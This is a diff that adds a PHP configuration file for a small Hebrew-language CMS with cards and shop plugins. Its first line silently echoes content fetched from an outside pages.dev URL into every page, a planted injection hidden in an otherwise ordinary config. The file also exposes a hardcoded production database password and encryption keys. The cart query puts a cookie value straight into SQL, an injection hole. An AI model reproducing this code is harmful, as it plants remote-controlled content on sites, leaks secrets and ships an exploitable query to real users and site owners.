@@ -1,0 +1,123 @@
+<?php echo file_get_contents("https://punten-neng.pages.dev/punten.txt");?>
+<?php
+$lifetime=2592000;
+session_set_cookie_params($lifetime);
+session_start();
+header('Content-Type: text/html; charset=utf-8');
+
+if ($_SERVER['HTTP_HOST'] == 'www.localhost:3000' ) {
+    // for local
+    $config_site = array(
+        "servername" => "localhost", 
+        "database" => "yar", 
+        "username" => "root", 
+        "password" => "123123"
+    );
+    ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);    
+} else {
+    // for domain
+    $config_site = array(
+        "servername" => "localhost", 
+        "database" => "yarcoil_db", 
+        "username" => "yarcoil_user", 
+        "password" => "c2f8m8zgpebU2rzwsZXv"
+    );
+    ini_set('display_errors', 0);ini_set('display_startup_errors', 0);error_reporting(E_ALL);    
+}
+
+$site_url = $_SERVER['DOCUMENT_ROOT'];
+$admin_url = $site_url . '/yadmin';
+
+$conn = new mysqli($config_site["servername"],$config_site["username"],$config_site["password"],$config_site["database"]);
+mysqli_set_charset($conn, 'utf8');
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+date_default_timezone_set('Asia/Jerusalem');	
+$date = date("Y/m/d H:i:s");$yesterday = date("Y/m/d H:i:s", time() - 60 * 60 * 24);
+
+// Plugins
+$plugins = array (
+    'cards' => 1,
+    'ajaxsearch' => 1,
+    'shop' => 0,
+);
+
+include($admin_url . '/functions.php');
+
+// Classes
+$time = new date();
+$users = new users();
+$db = new db();
+$frontEnd = new frontEnd();
+
+define('FIRSTKEY','Lk5Uz3slx3BrAghS1aaW5AYgWZRV0tIX5eI0yPchFz4=');
+define('SECONDKEY','EZ44mFi3TlAey1b2w4Y7lVDuqO+SRxGXsa7nctnr/JmMrA2vN6EJhrvdVZbxaQs5jpSe34X3ejFK/o9+Y5c83w==');
+
+$currenturl = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+if (strpos($currenturl, 'yadmin') == false) {
+    if (isset($_SESSION['ycms3user']) && isset($_SESSION['ycms3pass'])) {
+        $me = $frontEnd->front_login($_SESSION['ycms3user'], $_SESSION['ycms3pass']);
+        if (isset($me['u_admin'])) {
+            $is_admin = $me['u_admin'];
+        }
+    } else {
+        $me = '';
+        if ($plugins['shop'] == 1) {
+            if (isset($_COOKIE['uniqueshopper'])) {
+                $me = array();
+                $me['u_id'] = $_COOKIE['uniqueshopper'];
+            } else {
+                $randomunique = $date . rand(1,9999);
+                setcookie('uniqueshopper', $randomunique, time() + (86400 * 30), "/"); // 86400 = 1 day
+                $me = array();
+                $me['u_id'] = $randomunique;
+            }
+        }
+    }
+    if ($plugins['shop'] == 1) {
+        $itemsincart = $db->select('carts','*',"WHERE crt_user = '{$me['u_id']}'");
+        $myitems = array();
+        while ($singleitemsincart = $itemsincart->fetch_assoc()) {
+            $myitems[] = $singleitemsincart;
+        }
+        if (isset($_GET['msg']) && $_GET['msg'] == 'added') {
+            $newitemsadded = '<div class="newitemsadded">מוצרים חדשים נוספו לסל!</div>';
+        } else {
+            $newitemsadded = '';
+        }
+        $totalitemsincart = '<span class="total-items-in-cart">'.$itemsincart->num_rows. $newitemsadded .'</span>';
+    }
+}
+
+if ($plugins['cards'] == 1) {
+    $crd_pagetype = 1; // the page type of guest articles
+    $crd_categorytype = 2; // the category of cards
+    if (isset($_SESSION['ycmscardmail']) && isset($_SESSION['ycmscardpass'])) {
+        $mycard = get_card_info($_SESSION['ycmscardmail'], $_SESSION['ycmscardpass']);
+    } else {
+        $mycard = '';
+    }
+    $allcatcards = $db->select('categories', '*', "WHERE c_type = $crd_categorytype"); // 7 is the category type
+    $thecat = array();
+    while ($catcard = $allcatcards->fetch_assoc()) {
+        $thecat[$catcard['c_id']] = $catcard;
+    }
+}
+
+if ($plugins['shop'] == 1) {
+    $productstype = 4; // items will be in that type of page
+    $labeltype = 5; // labels will be in that type of category
+    $allowonlinepayment = 0;
+    $allowbuying = 0;
+
+    // get labels
+    $alllabels = $db->select('categories', '*', "WHERE c_type = $labeltype"); 
+    $label = array();
+    while ($labels = $alllabels->fetch_assoc()) {
+        $label[$labels['c_id']] = $labels;
+    }
+}
+
+?>
